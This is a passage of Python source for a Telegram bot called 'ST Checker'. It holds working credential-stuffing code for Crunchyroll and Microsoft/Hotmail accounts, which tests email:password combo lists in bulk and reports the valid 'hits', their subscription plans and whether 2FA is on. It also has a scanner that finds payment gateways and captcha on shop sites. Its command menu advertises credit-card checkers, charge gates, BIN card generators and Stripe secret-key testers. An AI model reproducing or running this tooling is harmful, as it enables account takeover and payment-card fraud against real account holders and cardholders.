        f"&client_id={_CROLL_CLIENT_ID}&client_secret={_CROLL_CLIENT_SK}"
        f"&device_type=SamsungTV&device_id={guid}&device_name=SM-G998U"
    )
    try:
        r1 = requests.post(_CROLL_TOKEN_URL, data=payload1,
                           headers=hdrs1, timeout=25, verify=False)
        t1 = r1.text
        if "invalid_grant" in t1 or "access_token.invalid" in t1:
            return {"status": "bad", "msg": "Invalid credentials"}
        if '"error":' in t1 and "access_token" not in t1:
            return {"status": "bad", "msg": "Invalid credentials"}
        if "rate_limited" in t1.lower() or "You are being rate limited" in t1:
            return {"status": "error", "msg": "Rate limited"}
        if "access_token" not in t1:
            return {"status": "bad", "msg": "No token"}

        j1         = r1.json()
        token      = j1.get("access_token", "")
        account_id = j1.get("account_id", "")

        hdrs2 = {
            "User-Agent":                  ua,
            "host":                        "beta-api.crunchyroll.com",
            "authorization":               f"Bearer {token}",
            "accept-encoding":             "gzip",
            "x-datadog-sampling-priority": "0",
            "etp-anonymous-id":            guid,
        }

        r2  = requests.get(_CROLL_ME_URL, headers=hdrs2, timeout=20, verify=False)
        j2  = r2.json() if r2 else {}
        ext = j2.get("external_id") or account_id

        # free/forbidden account
        if "accounts.get_account_info.forbidden" in r2.text:
            return {
                "status": "free",
                "msg":    "Free Account",
                "plan":   "No Subscription",
                "country":"N/A",
            }

        # Subscription benefits
        sub_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{ext}/benefits"
        r4      = requests.get(sub_url, headers=hdrs2, timeout=20, verify=False)
        t4      = r4.text if r4 else ""

        if '"total":0' in t4 or "subscription.not_found" in t4 or '"items":[]' in t4:
            return {
                "status": "free",
                "msg":    "Free Account (No Sub)",
                "plan":   "No Subscription",
                "country":"N/A",
            }

        # Detect plan
        plan = "PREMIUM"
        if '"concurrent_streams.' in t4:
            ms = t4.split('"concurrent_streams.')[1].split('"')[0]
            plan = {"6": "ULTIMATE FAN", "4": "MEGA FAN", "1": "FAN"}.get(ms, "PREMIUM")

        # Country from subscription
        try:
            country = r4.json().get("subscription_country", "N/A")
        except Exception:
            country = "N/A"

        # Subscription v4 for more info
        sub4_url = f"https://beta-api.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
        r5       = requests.get(sub4_url, headers=hdrs2, timeout=15, verify=False)
        renew = price = ""
        if r5:
            try:
                j5    = r5.json()
                items = j5.get("items", [])
                if items:
                    itm   = items[0]
                    price = itm.get("billing_details", {}).get("amount_due", "")
                    renew = itm.get("next_renewal_date", "")[:10] if itm.get("next_renewal_date") else ""
            except Exception:
                pass

        return {
            "status":  "hit",
            "msg":     "Premium Hit",
            "plan":    plan,
            "country": country or "N/A",
            "price":   str(price) if price else "N/A",
            "renew":   renew or "N/A",
        }

    except requests.exceptions.Timeout:
        return {"status": "error", "msg": "Timeout"}
    except Exception as ex:
        return {"status": "error", "msg": str(ex)[:120]}


def _croll_fmt(r: dict, combo: str) -> str:
    s = r["status"]
    if s == "hit":
        return (
            f"✅ <b>PREMIUM HIT</b>\n"
            f"📧 <code>{combo}</code>\n"
            f"🎌 Plan    : <b>{r.get('plan','N/A')}</b>\n"
            f"🌍 Country : <b>{r.get('country','N/A')}</b>\n"
            f"💰 Price   : <b>{r.get('price','N/A')}</b>\n"
            f"📅 Renews  : <b>{r.get('renew','N/A')}</b>"
        )
    elif s == "free":
        return f"🆓 <b>Free</b> | <code>{combo}</code>"
    elif s == "bad":
        return f"❌ <b>Bad</b> | <code>{combo}</code>"
    else:
        return f"⚠️ <b>Error</b> | <code>{combo}</code> — {r.get('msg','')}"


@bot.message_handler(commands=['croll'])
def cmd_croll(message):
    text = message.text or ""
    combos_raw = [l.strip() for l in text.split("\n")[1:] if ":" in l.strip()]
    parts = text.split(None, 1)
    if len(parts) > 1 and ":" in parts[1] and "\n" not in parts[1]:
        combos_raw = [parts[1].strip()]

    if not combos_raw:
        bot.reply_to(message,
            "<b>🎌 Crunchyroll Checker\n\n"
            "Single:\n<code>/croll email:password</code>\n\n"
            "Mass:\n<code>/croll\nemail1:pass1\nemail2:pass2</code></b>",
            parse_mode='HTML')
        return

    if len(combos_raw) == 1:
        wm    = bot.reply_to(message, "<b>🎌 Crunchyroll | ⏳ Checking...</b>", parse_mode='HTML')
        combo = combos_raw[0]
        em, pw = combo.split(":", 1)
        r = _croll_check_one(em.strip(), pw.strip())
        bot.edit_message_text(
            f"<b>🎌 Crunchyroll Checker\n\n{_croll_fmt(r, combo)}</b>\n\n"
            f"<i>⚙️ by @YadistanBot</i>",
            chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
        )
        return

    total  = len(combos_raw)
    hits = free_ct = bad_ct = err_ct = 0
    wm    = bot.reply_to(message,
        f"<b>🎌 Crunchyroll Mass | 0/{total}</b>", parse_mode='HTML')
    results = []

    def _do(combo):
        try:
            em, pw = combo.split(":", 1)
            return combo, _croll_check_one(em.strip(), pw.strip())
        except Exception as ex:
            return combo, {"status": "error", "msg": str(ex)}

    with ThreadPoolExecutor(max_workers=5) as pool:
        futs = {pool.submit(_do, c): c for c in combos_raw}
        done = 0
        for fut in as_completed(futs):
            combo, r = fut.result()
            done += 1
            s = r["status"]
            if s == "hit":    hits   += 1
            elif s == "free": free_ct += 1
            elif s == "bad":  bad_ct  += 1
            else:             err_ct  += 1
            results.append(_croll_fmt(r, combo))
            if done % 5 == 0 or done == total:
                try:
                    bot.edit_message_text(
                        f"<b>🎌 Crunchyroll Mass | {done}/{total}\n"
                        f"✅ Premium: {hits}  🆓 Free: {free_ct}  "
                        f"❌ Bad: {bad_ct}  ⚠️ Err: {err_ct}</b>",
                        chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
                    )
                except Exception:
                    pass

    try:
        bot.edit_message_text(
            f"<b>🎌 Crunchyroll Mass — Done ✅\n\n"
            f"📊 Total   : {total}\n✅ Premium: {hits}\n"
            f"🆓 Free    : {free_ct}\n❌ Bad: {bad_ct}\n⚠️ Err: {err_ct}</b>",
            chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
        )
    except Exception:
        pass

    hit_lines = [r for r in results if r.startswith("✅")]
    if hit_lines:
        chunk = "\n\n".join(hit_lines)
        for i in range(0, len(chunk), 4000):
            bot.send_message(message.chat.id,
                f"<b>🎌 Crunchyroll Hits:\n\n{chunk[i:i+4000]}</b>",
                parse_mode='HTML')


# ─────────────────────────── HOTMAIL / OUTLOOK CHECKER ────────────────────────

_HMAIL_SCOPES = "service::account.microsoft.com::MBI_SSL"

def _hmail_check_one(email: str, password: str) -> dict:
    """Simplified Microsoft account checker via login.live.com."""
    sess = requests.Session()
    ua   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
    sess.headers.update({
        "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
    })
    try:
        # Step 1: Get PPFT + sFTTag from login page
        r1 = sess.get(
            "https://login.live.com/login.srf?"
            "wa=wsignin1.0&rpsnv=13&ct=1681000000&rver=7.0.6737.0"
            "&wp=MBI_SSL&wreply=https://account.microsoft.com/auth/complete-signin"
            "&lc=1033&id=292666",
            timeout=20
        )
        html1 = r1.text
        import re as _re_hm
        ppft_m = _re_hm.search(r'name="PPFT"\s+id=".*?"\s+value="([^"]+)"', html1)
        url_m  = _re_hm.search(r"urlPost:'([^']+)'", html1)
        if not ppft_m or not url_m:
            return {"status": "error", "msg": "Could not parse login page"}

        ppft     = ppft_m.group(1)
        post_url = url_m.group(1)

        # Step 2: POST credentials
        r2 = sess.post(post_url,
            data = {
                "login":  email,
                "passwd": password,
                "PPFT":   ppft,
                "PPSX":   "PassportR",
                "SI":     "Sign in",
                "type":   "11",
                "NewUser":"1",
                "LoginOptions":"3",
                "i3":   "36728",
                "m1":   "768",
                "m2":   "1280",
                "m3":   "0",
                "i12":  "1",
                "i17":  "0",
                "i18":  "__Login_Host|1",
            },
            headers = {"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects = True,
            timeout = 25,
        )
        html2 = r2.text
        url2  = r2.url

        # Classify result
        if "srf_uotw" in html2 or "account.microsoft.com" in url2:
            # Check 2FA indicators
            two_fa = any(k in html2 for k in [
                "otc", "proofType", "TwoFactor", "proof", "authenticator", "QAT"
            ])
            name_m = _re_hm.search(r'"DisplayName"\s*:\s*"([^"]+)"', html2)
            name   = name_m.group(1) if name_m else email.split("@")[0]
            return {
                "status": "hit",
                "msg":    "✅ Valid Account",
                "name":   name,
                "2fa":    "🔐 Yes" if two_fa else "✅ No",
                "email":  email,
            }
        elif "sSigninName" in html2 and "identity/confirm" in html2:
            return {"status": "hit", "msg": "Valid (Needs Confirm)", "name": email, "2fa": "🔐 Yes", "email": email}
        elif any(k in html2 for k in ["passwordError", "PasswordError", "ct=wrongpassword",
                                       "Your account or password is incorrect"]):
            return {"status": "bad", "msg": "Wrong password"}
        elif "account doesn" in html2.lower() or "accountDoesNotExist" in html2:
            return {"status": "bad", "msg": "Account not found"}
        elif any(k in html2 for k in ["locked", "Locked", "suspended"]):
            return {"status": "locked", "msg": "Account locked"}
        else:
            return {"status": "bad", "msg": "Login failed"}

    except requests.exceptions.Timeout:
        return {"status": "error", "msg": "Timeout"}
    except Exception as ex:
        return {"status": "error", "msg": str(ex)[:120]}


def _hmail_fmt(r: dict, combo: str) -> str:
    s = r["status"]
    if s == "hit":
        return (
            f"✅ <b>HIT</b>\n"
            f"📧 <code>{combo}</code>\n"
            f"👤 Name  : <b>{r.get('name','N/A')}</b>\n"
            f"🔐 2FA   : <b>{r.get('2fa','N/A')}</b>"
        )
    elif s == "locked":
        return f"🔒 <b>Locked</b> | <code>{combo}</code>"
    elif s == "bad":
        return f"❌ <b>Bad</b> | <code>{combo}</code>"
    else:
        return f"⚠️ <b>Error</b> | <code>{combo}</code> — {r.get('msg','')}"


@bot.message_handler(commands=['hmail'])
def cmd_hmail(message):
    text = message.text or ""
    combos_raw = [l.strip() for l in text.split("\n")[1:] if ":" in l.strip()]
    parts = text.split(None, 1)
    if len(parts) > 1 and ":" in parts[1] and "\n" not in parts[1]:
        combos_raw = [parts[1].strip()]

    if not combos_raw:
        bot.reply_to(message,
            "<b>📧 Hotmail / Outlook Checker\n\n"
            "Single:\n<code>/hmail email:password</code>\n\n"
            "Mass:\n<code>/hmail\nemail1:pass1\nemail2:pass2</code></b>",
            parse_mode='HTML')
        return

    if len(combos_raw) == 1:
        wm    = bot.reply_to(message, "<b>📧 Hotmail | ⏳ Checking...</b>", parse_mode='HTML')
        combo = combos_raw[0]
        em, pw = combo.split(":", 1)
        r = _hmail_check_one(em.strip(), pw.strip())
        bot.edit_message_text(
            f"<b>📧 Hotmail Checker\n\n{_hmail_fmt(r, combo)}</b>\n\n"
            f"<i>⚙️ by @YadistanBot</i>",
            chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
        )
        return

    total = len(combos_raw)
    hits = bad_ct = lock_ct = err_ct = 0
    wm   = bot.reply_to(message,
        f"<b>📧 Hotmail Mass | 0/{total}</b>", parse_mode='HTML')
    results = []

    def _do(combo):
        try:
            em, pw = combo.split(":", 1)
            return combo, _hmail_check_one(em.strip(), pw.strip())
        except Exception as ex:
            return combo, {"status": "error", "msg": str(ex)}

    with ThreadPoolExecutor(max_workers=4) as pool:
        futs = {pool.submit(_do, c): c for c in combos_raw}
        done = 0
        for fut in as_completed(futs):
            combo, r = fut.result()
            done += 1
            s = r["status"]
            if s == "hit":    hits   += 1
            elif s == "locked":lock_ct += 1
            elif s == "bad":  bad_ct  += 1
            else:             err_ct  += 1
            results.append(_hmail_fmt(r, combo))
            if done % 5 == 0 or done == total:
                try:
                    bot.edit_message_text(
                        f"<b>📧 Hotmail Mass | {done}/{total}\n"
                        f"✅ Hit: {hits}  🔒 Locked: {lock_ct}  "
                        f"❌ Bad: {bad_ct}  ⚠️ Err: {err_ct}</b>",
                        chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
                    )
                except Exception:
                    pass

    try:
        bot.edit_message_text(
            f"<b>📧 Hotmail Mass — Done ✅\n\n"
            f"📊 Total   : {total}\n✅ Hit: {hits}\n"
            f"🔒 Locked  : {lock_ct}\n❌ Bad: {bad_ct}\n⚠️ Err: {err_ct}</b>",
            chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
        )
    except Exception:
        pass

    hit_lines = [r for r in results if r.startswith("✅")]
    if hit_lines:
        chunk = "\n\n".join(hit_lines)
        for i in range(0, len(chunk), 4000):
            bot.send_message(message.chat.id,
                f"<b>📧 Hotmail Hits:\n\n{chunk[i:i+4000]}</b>",
                parse_mode='HTML')


# ─────────────────────────── SITE GATE CHECKER ────────────────────────────────

_SITE_GATEWAYS = [
    (r'stripe\.com|stripe\.js|pk_(?:live|test)_|wc.*stripe|stripe-card-element',
     'Stripe'),
    (r'braintree|braintreepayments|dropin\.js',              'Braintree'),
    (r'paypal\.com/sdk|paypal\.com/js|paypalobjects',        'PayPal'),
    (r'square(?:up)?\.com|Square Payments',                  'Square'),
    (r'authorize\.net|AcceptUI',                             'Authorize.Net'),
    (r'2checkout|avangate',                                  '2Checkout'),
    (r'adyen\.com|adyen\.js',                                'Adyen'),
    (r'checkout\.com|frames\.js',                            'Checkout.com'),
    (r'worldpay|worldpay\.com',                              'WorldPay'),
    (r'mollie\.com|mollie-elements',                         'Mollie'),
    (r'klarna\.com|klarna-js',                               'Klarna'),
    (r'razorpay',                                            'Razorpay'),
    (r'payu\.in|payu\.biz',                                  'PayU'),
    (r'paddle\.com|paddlejs|paddle-checkout',                'Paddle'),
    (r'flutterwave|rave\.flutterwave',                       'Flutterwave'),
    (r'paystack',                                            'Paystack'),
    (r'bitpay',                                              'BitPay'),
    (r'coinbase.*commerce|commerce\.coinbase',               'Coinbase Commerce'),
    (r'fastspring',                                          'FastSpring'),
    (r'gumroad',                                             'Gumroad'),
    (r'iyzico|iyzipay',                                      'iyzico'),
    (r'paysafe|paysafecard',                                 'Paysafe'),
    (r'yookassa|yoomoney',                                   'YooKassa'),
    (r'ebanx\.com',                                          'EBANX'),
    (r'nmi\.com|networkmerchants',                           'NMI'),
    (r'cybersource',                                         'CyberSource'),
    (r'cardknox',                                            'Cardknox'),
    (r'sezzle',                                              'Sezzle'),
    (r'afterpay|clearpay',                                   'Afterpay'),
    (r'affirm\.com',                                         'Affirm'),
]

_SITE_CAPTCHA = [
    (r'recaptcha|grecaptcha|recaptcha\.net',         'reCAPTCHA'),
    (r'hcaptcha',                                    'hCaptcha'),
    (r'cloudflare.*challenge|cf-challenge|turnstile','Cloudflare Turnstile'),
    (r'funcaptcha|arkoselabs',                       'FunCaptcha/Arkose'),
    (r'captcha-container|captcha_image',             'Generic CAPTCHA'),
]

_SITE_3DS = [
    (r'setupIntent|setup_intent|stripe\.confirmCardSetup', 'Stripe 3DS SetupIntent'),
    (r'requires_action|payment_intent.*action',            'Payment 3DS Flow'),
    (r'3ds2?|ThreeDS|threeds',                             '3D Secure'),
    (r'Cardinal|cardinalcommerce',                         'Cardinal Commerce 3DS'),
]

def _site_detect(url: str, timeout: int = 15) -> dict:
    """Fetch URL and detect payment gateways, captcha, 3DS, CMS."""
    import re as _re_site
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        hdrs = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        r   = requests.get(url, headers=hdrs, timeout=timeout,
                           allow_redirects=True, verify=False)
        html = r.text
        final_url = r.url

        gateways = [name for pat, name in _SITE_GATEWAYS
                    if _re_site.search(pat, html, _re_site.I)]
        captchas  = [name for pat, name in _SITE_CAPTCHA
                    if _re_site.search(pat, html, _re_site.I)]
        tds_found = [name for pat, name in _SITE_3DS
                    if _re_site.search(pat, html, _re_site.I)]

        # CMS detection
        cms = "Unknown"
        if _re_site.search(r'wp-content|wp-includes|woocommerce', html, _re_site.I):
            cms = "WordPress / WooCommerce"
        elif _re_site.search(r'shopify\.com|cdn\.shopify', html, _re_site.I):
            cms = "Shopify"
        elif _re_site.search(r'magento|mage\.cookies', html, _re_site.I):
            cms = "Magento"
        elif _re_site.search(r'squarespace', html, _re_site.I):
            cms = "Squarespace"
        elif _re_site.search(r'bigcommerce', html, _re_site.I):
            cms = "BigCommerce"
        elif _re_site.search(r'prestashop', html, _re_site.I):
            cms = "PrestaShop"
        elif _re_site.search(r'opencart', html, _re_site.I):
            cms = "OpenCart"
        elif _re_site.search(r'drupal', html, _re_site.I):
            cms = "Drupal"
        elif _re_site.search(r'joomla', html, _re_site.I):
            cms = "Joomla"

        # Cloudflare?
        cf = "Yes" if (_re_site.search(r'cloudflare|cf-ray', html, _re_site.I)
                       or "cf-ray" in str(r.headers).lower()) else "No"

        # SSL
        ssl_ok = final_url.startswith("https://")

        return {
            "ok":         True,
            "url":        final_url,
            "status":     r.status_code,
            "cms":        cms,
            "gateways":   gateways or ["None Detected"],
            "captchas":   captchas or ["None"],
            "cloudflare": cf,
            "tds":        tds_found or ["None"],
            "ssl":        "✅ Yes" if ssl_ok else "❌ No",
        }

    except requests.exceptions.Timeout:
        return {"ok": False, "error": "Timeout"}
    except Exception as ex:
        return {"ok": False, "error": str(ex)[:150]}


def _site_fmt(d: dict, url_input: str) -> str:
    if not d.get("ok"):
        return f"❌ <b>Error</b> — {d.get('error','Unknown')}\n🔗 <code>{url_input}</code>"
    gws = " | ".join(d['gateways'])
    cap = " | ".join(d['captchas'])
    tds = " | ".join(d['tds'])
    return (
        f"🌐 <b>Site Gate Checker</b>\n\n"
        f"🔗 URL        : <code>{d['url']}</code>\n"
        f"📊 Status     : <b>{d['status']}</b>\n"
        f"🔒 SSL        : <b>{d['ssl']}</b>\n"
        f"☁️ Cloudflare : <b>{d['cloudflare']}</b>\n"
        f"🛒 CMS        : <b>{d['cms']}</b>\n\n"
        f"💳 Gateways   : <b>{gws}</b>\n"
        f"🤖 Captcha    : <b>{cap}</b>\n"
        f"🔐 3DS/Auth   : <b>{tds}</b>"
    )


@bot.message_handler(commands=['site'])
def cmd_site(message):
    text  = message.text or ""
    parts = text.split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>🌐 Site Gate Checker\n\n"
            "Single:\n<code>/site https://example.com</code>\n\n"
            "Mass (one per line):\n<code>/site\nhttps://site1.com\nhttps://site2.com</code></b>",
            parse_mode='HTML')
        return

    lines = text.split("\n")
    urls  = []
    # First line might have URL after /site
    first = lines[0].split(None, 1)
    if len(first) > 1 and first[1].strip():
        urls.append(first[1].strip())
    for l in lines[1:]:
        u = l.strip()
        if u:
            urls.append(u)

    if len(urls) == 1:
        wm = bot.reply_to(message, f"<b>🌐 Checking <code>{urls[0]}</code>...</b>", parse_mode='HTML')
        d  = _site_detect(urls[0])
        bot.edit_message_text(
            _site_fmt(d, urls[0]),
            chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
        )
        return

    # Mass
    total = len(urls)
    wm    = bot.reply_to(message, f"<b>🌐 Site Mass Check | 0/{total}</b>", parse_mode='HTML')
    results = []

    def _do_site(u):
        return u, _site_detect(u)

    with ThreadPoolExecutor(max_workers=5) as pool:
        futs = {pool.submit(_do_site, u): u for u in urls}
        done = 0
        for fut in as_completed(futs):
            u, d = fut.result()
            done += 1
            results.append(_site_fmt(d, u))
            if done % 3 == 0 or done == total:
                try:
                    bot.edit_message_text(
                        f"<b>🌐 Site Mass | {done}/{total} checked...</b>",
                        chat_id=message.chat.id, message_id=wm.message_id, parse_mode='HTML'
                    )
                except Exception:
                    pass

    try:
        bot.delete_message(message.chat.id, wm.message_id)
    except Exception:
        pass
    chunk = "\n\n━━━━━━━━━━━━\n\n".join(results)
    for i in range(0, len(chunk), 4000):
        bot.send_message(message.chat.id, chunk[i:i+4000], parse_mode='HTML')


def _handle_sigterm(signum, frame):
    print("[BOT] SIGTERM received — shutting down cleanly.")
    try:
        bot.stop_polling()
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGTERM, _handle_sigterm)

# ── Dot-command router: .cmd works same as /cmd ─────────────────────────────
@bot.message_handler(func=lambda m: (
    m.text and m.text.startswith('.') and len(m.text) > 1 and m.text[1:2].isalpha()
))
def _dot_command_router(message):
    """Intercepts .cmd messages, rewrites to /cmd, dispatches to registered handler."""
    message.text = '/' + message.text[1:]
    cmd = message.text.split()[0][1:].split('@')[0].lower()
    for handler in bot.message_handlers:
        flt = handler.get('filters', {})
        if 'commands' in flt and cmd in [c.lower() for c in flt['commands']]:
            try:
                handler['function'](message)
            except Exception:
                pass
            return

# ── Register BotFather command list ─────────────────────────────────────────
try:
    bot.set_my_commands([
        telebot.types.BotCommand("help",        "📋 Full command list"),
        telebot.types.BotCommand("chk",         "🆓 Single card checker"),
        telebot.types.BotCommand("chkm",        "🆓 Mass CC checker (unlimited)"),
        telebot.types.BotCommand("lchk",        "🔎 Luhn validator (instant, no API)"),
        telebot.types.BotCommand("vbv",         "🆓 Braintree 3DS auth"),
        telebot.types.BotCommand("oc",          "🌐 OC Checker [VIP]"),
        telebot.types.BotCommand("st",          "⚡ Stripe Charge [VIP]"),
        telebot.types.BotCommand("dr",          "🔥 DrGaM GiveWP Charge [VIP]"),
        telebot.types.BotCommand("drm",         "🔥 DrGaM Mass Checker [VIP]"),
        telebot.types.BotCommand("sa",          "🔐 Stripe Auth $0 [VIP]"),
        telebot.types.BotCommand("stm",         "🚀 Stripe Mass Check [VIP]"),
        telebot.types.BotCommand("co",          "🌐 Stripe Checkout [VIP]"),
        telebot.types.BotCommand("co2",         "🌐 StripV2 Checker [VIP]"),
        telebot.types.BotCommand("xco",         "🔗 XCO Checkout [VIP]"),
        telebot.types.BotCommand("pp",          "💰 PayPal Charge [VIP]"),
        telebot.types.BotCommand("ppm",         "💳 PayPal Mass Check [VIP]"),
        telebot.types.BotCommand("p",           "⚡ PayPal Charge API [VIP]"),
        telebot.types.BotCommand("sp",          "🛒 Shopify v6 [VIP]"),
        telebot.types.BotCommand("sp2",         "🛒 Shopify Gate1 Async [VIP]"),
        telebot.types.BotCommand("sp14",        "🛒 Shopify Gate2 v14 Async [VIP]"),
        telebot.types.BotCommand("wcs",         "🔵 WooCommerce Stripe [VIP]"),
        telebot.types.BotCommand("auth",        "🔐 Assoc Stripe Auth $0 [VIP]"),
        telebot.types.BotCommand("b3",          "🟢 Braintree $0 Auth [VIP]"),
        telebot.types.BotCommand("brt",         "🟢 Braintree $1 Charge [VIP]"),
        telebot.types.BotCommand("h",           "🎯 Stripe Hitter [VIP]"),
        telebot.types.BotCommand("ah",          "🔥 Auto Hitter multi-gate [VIP]"),
        telebot.types.BotCommand("br",          "🐾 Bravehound $1 Charge [VIP]"),
        telebot.types.BotCommand("sk",          "🗝️ Single SK check [VIP]"),
        telebot.types.BotCommand("skm",         "🗝️ Mass SK checker [VIP]"),
        telebot.types.BotCommand("skchk",       "🗝️ SK inspector [VIP]"),
        telebot.types.BotCommand("msk",         "🗝️ Mass SK key tester [VIP]"),
        telebot.types.BotCommand("gen",         "🎰 Generate cards from BIN"),
        telebot.types.BotCommand("extrap",      "🎲 Extrapolate cards from BIN"),
        telebot.types.BotCommand("gc",          "⚡ Gen BIN + Check via chkr.cc"),
        telebot.types.BotCommand("bin",         "🔍 BIN lookup"),
        telebot.types.BotCommand("sq",          "🔧 CC Aligner / Formatter"),
        telebot.types.BotCommand("addproxy",    "🕷️ Set your proxy"),
        telebot.types.BotCommand("removeproxy", "🕷️ Remove your proxy"),
        telebot.types.BotCommand("proxycheck",  "🕷️ Test proxy speed"),
        telebot.types.BotCommand("scr",         "🕷️ Scrape fresh proxies"),
        telebot.types.BotCommand("setamount",   "⚙️ Set charge amount"),
        telebot.types.BotCommand("setsk",       "⚙️ Save your Stripe SK"),
        telebot.types.BotCommand("mysk",        "⚙️ View your saved SK"),
        telebot.types.BotCommand("delsk",       "⚙️ Delete your SK"),
        telebot.types.BotCommand("merge",        "🔗 Combine all live hits"),
        telebot.types.BotCommand("ping",        "🏓 Bot latency check"),
        telebot.types.BotCommand("myid",        "🪪 Your Telegram user ID"),
        telebot.types.BotCommand("redeem",      "🎟️ Redeem a VIP code"),
    ])
    print("[BOT] BotFather command list updated.")
except Exception as _e:
    print(f"[BOT] set_my_commands failed: {_e}")

def _notify_vip_on_startup():
    import datetime as _dt
    import time as _time
    try:
        with open("data.json", 'r', encoding='utf-8') as _f:
            _data = json.load(_f)
    except Exception:
        return
    try:
        _bot_username = bot.get_me().username or "stcheckerbot"
    except Exception:
        _bot_username = "stcheckerbot"
    _now = _dt.datetime.now().strftime("%d %b %Y • %H:%M UTC")
    _msg = (
        f"<b>✨ ✦ ─── B O T   U P D A T E D ─── ✦ ✨\n"
        f"╔══════════════════════════╗\n"
        f"║  🚀  S T - C H E C K E R  ║\n"
        f"║  ⚡  B O T  O N L I N E  ║\n"
        f"╚══════════════════════════╝\n"
        f"│\n"
        f"│ ✅ Bot has been updated & restarted\n"
        f"│ 🔧 New features & fixes applied\n"
        f"│ 🛡️ All systems running smoothly\n"
        f"│\n"
        f"│ 🕐 {_now}\n"
        f"│\n"
        f"│ 💎 VIP Members — you're good to go!\n"
        f"│    Use your commands anytime ⚡\n"
        f"└──────────────────────────\n"
        f"   ⌤ <a href='https://t.me/yadistan'>ST Checker Bot</a></b>"
    )
    _kb = types.InlineKeyboardMarkup(row_width=2)
    _kb.add(
        types.InlineKeyboardButton(text="🤖 Open Bot", url=f"https://t.me/{_bot_username}"),
        types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan")
    )
    for _uid, _udata in _data.items():
        try:
            _uid_int = int(_uid)
        except (ValueError, TypeError):
            continue
        try:
            _plan = _udata.get('plan', '𝗙𝗥𝗘𝗘')
            if _plan not in ('𝗙𝗥𝗘𝗘', '') and _uid_int != admin:
                bot.send_message(_uid_int, _msg, parse_mode='HTML',
                                 reply_markup=_kb, disable_web_page_preview=True)
                _time.sleep(0.05)
        except Exception:
            pass

# VIP startup notification disabled
# threading.Thread(target=_notify_vip_on_startup, daemon=True).start()

while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=30, logger_level=None)
    except KeyboardInterrupt:
        print("[BOT] Stopped by user.")
        try:
            import datetime as _dt2
            _now2 = _dt2.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            bot.send_message(admin,
                f"<b>╔══════════════════════╗\n"
                f"║  🔴  BOT IS OFFLINE!  ║\n"
                f"╚══════════════════════╝\n\n"
                f"⛔ Bot stopped manually.\n\n"
                f"⏰ Time: <code>{_now2}</code>\n\n"
                f"[⌤] YADISTAN - 🍀</b>", parse_mode='HTML')
        except:
            pass
        sys.exit(0)
    except Exception as e:
        print(f"[BOT] Polling error: {e}. Reconnecting in 10s...")
        time.sleep(10)